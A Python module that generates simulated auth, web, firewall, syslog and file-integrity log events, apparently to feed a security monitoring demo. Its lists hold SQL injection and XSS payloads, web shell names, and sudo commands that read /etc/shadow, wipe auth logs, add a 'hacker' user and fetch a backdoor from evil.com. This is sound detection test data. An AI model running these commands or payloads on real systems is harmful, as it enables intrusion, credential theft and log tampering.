import asyncio
import random
from datetime import datetime
from app.models.log_event import LogEvent

_IPS = ["192.168.1.10", "10.0.0.5", "172.16.0.3", "203.0.113.42", "198.51.100.7"]
_ATTACK_IPS = ["45.33.32.156", "185.220.101.1", "91.219.237.0", "23.129.64.100", "116.31.116.42"]
_USERS = ["root", "admin", "ubuntu", "pi", "test", "guest"]
_PATHS = ["/", "/admin", "/login", "/api/data", "/.env", "/wp-admin", "/phpmyadmin"]
_METHODS = ["GET", "POST", "PUT", "DELETE"]

# SQL injection payloads for URL paths
_SQLI_PATHS = [
    "/api/users?id=1'+OR+'1'='1",
    "/search?q=admin'--",
    "/api/data?id=1;+DROP+TABLE+users",
    "/login?user=admin'+UNION+SELECT+*+FROM+users--",
    "/products?cat=1'+OR+1=1--",
]

# XSS payloads
_XSS_PATHS = [
    "/search?q=<script>alert('xss')</script>",
    "/comment?body=<img+onerror=alert(1)+src=x>",
    "/profile?name=javascript:alert(document.cookie)",
    "/post?title=<svg+onload=alert(1)>",
]

# Web shell paths
_WEBSHELL_PATHS = [
    "/c99.php", "/r57.php", "/shell.php", "/cmd.php", "/webshell.php",
    "/b374k.php", "/wso.php",
]

# Firewall protocols and ports
_FW_PROTOS = ["TCP", "UDP", "ICMP"]
_COMMON_PORTS = [22, 80, 443, 3306, 5432, 8080, 8443, 25, 587, 53]
_SUSPICIOUS_PORTS = [4444, 5555, 6666, 1337, 31337, 12345, 9999, 6667, 6697]

# System services
_SERVICES = [
    "sshd.service", "nginx.service", "apache2.service", "mysql.service",
    "postgresql.service", "docker.service", "firewalld.service",
    "cron.service", "rsyslog.service",
]

# Sudo commands
_SUDO_COMMANDS = [
    "/bin/cat /etc/shadow", "/usr/bin/apt update", "/bin/systemctl restart nginx",
    "/usr/bin/vim /etc/passwd", "/bin/chmod 777 /tmp/exploit",
    "/usr/sbin/useradd hacker", "/bin/rm -rf /var/log/auth.log",
    "/usr/bin/wget http://evil.com/backdoor.sh",
]

# FIM monitored paths
_FIM_CRITICAL_PATHS = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/ssh/sshd_config"]
_FIM_BINARY_PATHS = ["/usr/bin/ssh", "/usr/bin/sudo", "/usr/sbin/sshd", "/bin/login"]
_FIM_NORMAL_PATHS = ["/var/log/syslog", "/tmp/test.txt", "/home/user/.bashrc", "/etc/hostname"]
_FIM_ACTIONS = ["modified", "created", "deleted", "attributes_changed"]


_AUTH_TEMPLATES = [
    ("failed_login",  "WARNING",  lambda ip, user: f"May {datetime.now().day:02d} {datetime.now().strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Failed password for {user} from {ip} port 22"),
    ("login",         "INFO",     lambda ip, user: f"May {datetime.now().day:02d} {datetime.now().strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip} port 22"),
    ("invalid_user",  "WARNING",  lambda ip, user: f"May {datetime.now().day:02d} {datetime.now().strftime('%H:%M:%S')} server sshd[{random.randint(1000,9999)}]: Invalid user {user} from {ip}"),
]


def _random_auth_event() -> LogEvent:
    action, severity, template = random.choices(
        _AUTH_TEMPLATES, weights=[60, 25, 15]
    )[0]
    ip = random.choice(_IPS)
    user = random.choice(_USERS)
    raw = template(ip, user)
    return LogEvent(
        timestamp=datetime.now(),
        source="auth",
        raw=raw,
        ip=ip,
        user=user,
        action=action,
        status="FAILED" if action != "login" else "SUCCESS",
        severity=severity,
    )


def _random_access_event() -> LogEvent:
    ip = random.choice(_IPS + _ATTACK_IPS)
    method = random.choice(_METHODS)
    now = datetime.now()

    # Occasionally generate attack events
    attack_roll = random.random()
    if attack_roll < 0.05:
        # SQL injection
        path = random.choice(_SQLI_PATHS)
        action = "sql_injection"
        status = 200
        severity = "CRITICAL"
    elif attack_roll < 0.08:
        # XSS
        path = random.choice(_XSS_PATHS)
        action = "xss_attempt"
        status = 200
        severity = "CRITICAL"
    elif attack_roll < 0.10:
        # Web shell
        path = random.choice(_WEBSHELL_PATHS)
        action = "web_shell"
        status = random.choice([200, 404])
        severity = "CRITICAL"
    else:
        # Normal traffic
        path = random.choice(_PATHS)
        status = random.choices([200, 301, 400, 403, 404, 500], weights=[50, 5, 5, 10, 20, 10])[0]
        action = method
        severity = "INFO"
        if status >= 500:
            severity = "CRITICAL"
        elif status >= 400:
            severity = "WARNING"

    size = random.randint(100, 5000)
    raw = f'{ip} - - [{now.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "{method} {path} HTTP/1.1" {status} {size}'

    return LogEvent(
        timestamp=now,
        source="access",
        raw=raw,
        ip=ip,
        action=action,
        status=str(status),
        severity=severity,
        extra={"path": path, "size": str(size)},
    )


def _random_firewall_event() -> LogEvent:
    """Generate a simulated firewall (iptables/UFW) log event."""
    now = datetime.now()
    src_ip = random.choice(_IPS + _ATTACK_IPS)
    dst_ip = random.choice(["192.168.1.1", "10.0.0.1", "172.16.0.1"])
    proto = random.choice(_FW_PROTOS)

    # Decide action
    action_roll = random.random()
    if action_roll < 0.65:
        fw_action = "DROP"
        fw_label = "UFW BLOCK"
    else:
        fw_action = "ACCEPT"
        fw_label = "UFW ALLOW"

    # Port selection
    if random.random() < 0.3:
        dst_port = random.choice(_SUSPICIOUS_PORTS)
    else:
        dst_port = random.choice(_COMMON_PORTS)
    src_port = random.randint(1024, 65535)

    # Direction
    if random.random() < 0.7:
        in_iface = "eth0"
        out_iface = ""
        direction = "inbound"
    else:
        in_iface = ""
        out_iface = "eth0"
        direction = "outbound"

    severity = "WARNING" if fw_action == "DROP" else "INFO"

    raw = (
        f"{now.strftime('%b')} {now.day:02d} {now.strftime('%H:%M:%S')} firewall kernel: "
        f"[{fw_label}] IN={in_iface} OUT={out_iface} "
        f"SRC={src_ip} DST={dst_ip} "
        f"LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID={random.randint(1000,65535)} "
        f"PROTO={proto} SPT={src_port} DPT={dst_port}"
    )

    return LogEvent(
        timestamp=now,
        source="firewall",
        raw=raw,
        ip=src_ip,
        action=fw_action,
        status=fw_action,
        severity=severity,
        extra={
            "dst": dst_ip,
            "proto": proto,
            "src_port": str(src_port),
            "dst_port": str(dst_port),
            "direction": direction,
            "in_iface": in_iface,
            "out_iface": out_iface,
        },
    )


def _random_syslog_event() -> LogEvent:
    """Generate a simulated syslog event (sudo, service control, user management)."""
    now = datetime.now()
    event_type = random.choices(
        ["sudo_command", "sudo_failed", "service_stopped", "service_started", "user_added", "syslog_other"],
        weights=[30, 10, 15, 20, 5, 20]
    )[0]

    user = random.choice(_USERS)

    if event_type == "sudo_command":
        target_user = "root"
        command = random.choice(_SUDO_COMMANDS)
        raw = (
            f"{now.strftime('%b')} {now.day:02d} {now.strftime('%H:%M:%S')} server sudo: "
            f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER={target_user} ; COMMAND={command}"
        )
        return LogEvent(
            timestamp=now, source="syslog", raw=raw, user=user,
            action="sudo_command", status="SUCCESS", severity="INFO",
            extra={"program": "sudo", "target_user": target_user, "command": command, "hostname": "server"},
        )

    elif event_type == "sudo_failed":
        raw = (
            f"{now.strftime('%b')} {now.day:02d} {now.strftime('%H:%M:%S')} server sudo: "
            f"{user} : authentication failure ; logname= ; uid=1000 ; euid=0 ; "
            f"tty=/dev/pts/0 ; ruser={user} ; rhost= ; user=root"
        )
        return LogEvent(
            timestamp=now, source="syslog", raw=raw, user=user,
            action="sudo_failed", status="FAILED", severity="WARNING",
            extra={"program": "sudo", "hostname": "server"},
        )

    elif event_type in ("service_stopped", "service_started"):
        service = random.choice(_SERVICES)
        action_word = "Stopped" if event_type == "service_stopped" else "Started"
        raw = (
            f"{now.strftime('%b')} {now.day:02d} {now.strftime('%H:%M:%S')} server systemd[1]: "
            f"{action_word} {service}"
        )
        severity = "WARNING" if event_type == "service_stopped" else "INFO"
        return LogEvent(
            timestamp=now, source="syslog", raw=raw,
            action=event_type, severity=severity,
            extra={"program": "systemd[1]", "service": service, "hostname": "server"},
        )

    elif event_type == "user_added":
        new_user = random.choice(["hacker", "backdoor", "temp_admin", "deploy", "service_acct"])
        raw = (
            f"{now.strftime('%b')} {now.day:02d} {now.strftime('%H:%M:%S')} server useradd[{random.randint(1000,9999)}]: "
            f"new user: name={new_user}, UID={random.randint(1000,65534)}, "
            f"GID={random.randint(1000,65534)}, home=/home/{new_user}, shell=/bin/bash"
        )
        return LogEvent(
            timestamp=now, source="syslog", raw=raw, user=new_user,
            action="user_added", severity="WARNING",
            extra={"program": f"useradd[{random.randint(1000,9999)}]", "hostname": "server"},
        )

    else:
        raw = (
            f"{now.strftime('%b')} {now.day:02d} {now.strftime('%H:%M:%S')} server cron[{random.randint(1000,9999)}]: "
            f"({user}) CMD (/usr/local/bin/cleanup.sh)"
        )
        return LogEvent(
            timestamp=now, source="syslog", raw=raw, user=user,
            action="syslog_other", severity="INFO",
            extra={"program": f"cron[{random.randint(1000,9999)}]", "hostname": "server"},
        )


def _random_fim_event() -> LogEvent:
    """Generate a simulated File Integrity Monitoring (FIM) event."""
    now = datetime.now()
    action = random.choices(
        _FIM_ACTIONS, weights=[50, 20, 10, 20]
    )[0]

    # Pick path based on severity weight
    path_roll = random.random()
    if path_roll < 0.15:
        path = random.choice(_FIM_CRITICAL_PATHS)
    elif path_roll < 0.25:
        path = random.choice(_FIM_BINARY_PATHS)
    else:
        path = random.choice(_FIM_NORMAL_PATHS)

    md5 = f"{random.getrandbits(128):032x}"
    sha256 = f"{random.getrandbits(256):064x}"
    uid = random.choice([0, 1000, 33, 65534])
    gid = random.choice([0, 1000, 33, 65534])

    severity = "INFO"
    if action in ("modified", "deleted"):
        severity = "WARNING"

    raw = (
        f"{now.isoformat()} fim: action={action} path={path} "
        f"uid={uid} gid={gid} md5={md5} sha256={sha256}"
    )

    return LogEvent(
        timestamp=now,
        source="fim",
        raw=raw,
        action=action,
        severity=severity,
        extra={
            "path": path,
            "uid": str(uid),
            "gid": str(gid),
            "md5": md5,
            "sha256": sha256,
        },
    )


# All source generators with their weights
_SOURCE_GENERATORS = [
    ("auth",     _random_auth_event,     30),
    ("access",   _random_access_event,   30),
    ("firewall", _random_firewall_event, 20),
    ("syslog",   _random_syslog_event,   15),
    ("fim",      _random_fim_event,       5),
]


async def generate_logs(queue: asyncio.Queue, interval: float = 2.0):
    """Terus-menerus generate log event ke queue dengan interval tertentu."""
    sources = [s[0] for s in _SOURCE_GENERATORS]
    generators = [s[1] for s in _SOURCE_GENERATORS]
    weights = [s[2] for s in _SOURCE_GENERATORS]

    while True:
        idx = random.choices(range(len(sources)), weights=weights)[0]
        event = generators[idx]()
        await queue.put(event)
        await asyncio.sleep(interval)
